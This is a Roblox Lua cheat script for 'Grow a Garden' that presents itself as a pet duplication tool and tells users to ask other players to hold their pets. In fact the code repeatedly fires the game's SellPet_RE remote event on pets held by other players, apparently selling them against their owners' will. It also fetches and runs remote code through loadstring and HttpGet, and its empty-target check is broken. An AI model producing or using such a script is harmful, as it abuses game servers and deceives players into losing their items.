local WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()
local player = game.Players.LocalPlayer
local dupe_enabled = false


local ui = WindUI:CreateWindow({
		Title = "Grow a Garden DUPE",
		Icon = "flower",
		Author = "sh0vel prod.",
		Folder = "blablablabluhyewyewyew",
		Size = UDim2.fromOffset(210, 105),
		Transparent = true,
		IsOpenButtonEnabled = true,
		User = {
			Enabled = true,
			Anonymous = true
		},
		SideBarWidth = 125,
	})

local tab = ui:Tab({Title = "dupe"})

tab:Toggle({
    Title = "Dupe",
    Desc = "ask any player in server to hold any pet in his hand",

    Callback = function(val)
        dupe_enabled = val
        if val then
            local target = {}
        for _, pt in pairs(game.Players:GetPlayers()) do
            pcall(function()
                if pt ~= player then
                local tool = pt.Character:FindFirstChildOfClass("Tool")
                if tool:GetAttribute("ItemType") == "Pet" then
                    table.insert(target, tool)
                end
            end
            end)
        end

        if target == {} then
            WindUI:Notify({
							Title = "sh0vel prod.",
							Content = "Unknown Pet! Ask some player to hold his pet in hand",
							Duration = 2.5,
						})
            return
        end

         WindUI:Notify({
							Title = "sh0vel prod.",
							Content = "Found Pet! Dupe Started! Make sure pet in other player hand!",
							Duration = 2.5,
						})
        task.spawn(function()

            while dupe_enabled do
               task.wait()

               for _, z in pairs(target) do
                local Event = game:GetService("ReplicatedStorage").GameEvents.SellPet_RE
Event:FireServer(table.unpack({
    z
}))
               end
            end
        end)
        end
    end
})

tab:Button({
    Title = "Copy sh0vel prod. discord server invite link",

    Callback = function()
        setclipboard("https://discord.gg/bfKreHkF8a")
    end
})
